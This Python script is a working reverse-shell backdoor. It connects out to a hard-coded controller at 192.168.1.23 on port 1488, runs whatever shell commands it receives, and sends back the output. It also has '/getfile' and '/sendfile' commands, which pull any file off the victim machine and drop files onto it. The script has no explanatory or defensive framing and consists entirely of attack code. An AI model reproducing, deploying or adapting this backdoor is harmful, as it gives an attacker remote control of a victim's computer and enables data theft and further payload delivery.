import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

host, port = '192.168.1.23', 1488
s.connect((host, port))


def esc(command):
    try:
        return subprocess.check_output(command, shell=True, encoding='cp866').encode("cp866")
    except Exception as e:
        return str(e).encode("cp866")


while True:
    try:
        command = s.recv(1024).decode("cp866")
        
        if command == "/sendfile":
            s.send(b"ready") 
            filename = s.recv(1024).decode("cp866")
            s.send(b"ready")
            file_size = int(s.recv(1024).decode("cp866"))
            s.send(b"ready")
            received_size = 0
            with open(filename, "wb") as file:
                while received_size < file_size:
                    data = s.recv(min(4096, file_size - received_size))
                    if not data:
                        break
                    file.write(data)
                    received_size += len(data)
            if received_size == file_size:
                s.send(f"[+] File '{filename}' successfully sended ({received_size} bytes) [+]".encode("cp866"))
            else:
                s.send(f"[!] File transfer incomplete. Sended {received_size}/{file_size} bytes [!]".encode("cp866"))
        elif command == "/getfile":
            s.send(b"ready")
            file_path = s.recv(1024).decode("cp866")
            if not os.path.exists(file_path):
                s.send("File not found".encode("cp866"))
                continue
                
            file_size = os.path.getsize(file_path)
            s.send(str(file_size).encode("cp866"))
            s.recv(1024) 
            with open(file_path, 'rb') as file:
                total_sent = 0
                while total_sent < file_size:
                    data = file.read(4096)
                    s.send(data)
                    total_sent += len(data)
            response = s.recv(1024).decode("cp866")
        else:
            command_result = esc(command)
            s.send(command_result)
            if command_result == b'':
                s.send("[+] success [+]".encode("cp866"))

    except Exception as _ex:
        s.send(str(f"Error: {_ex}").encode("cp866"))
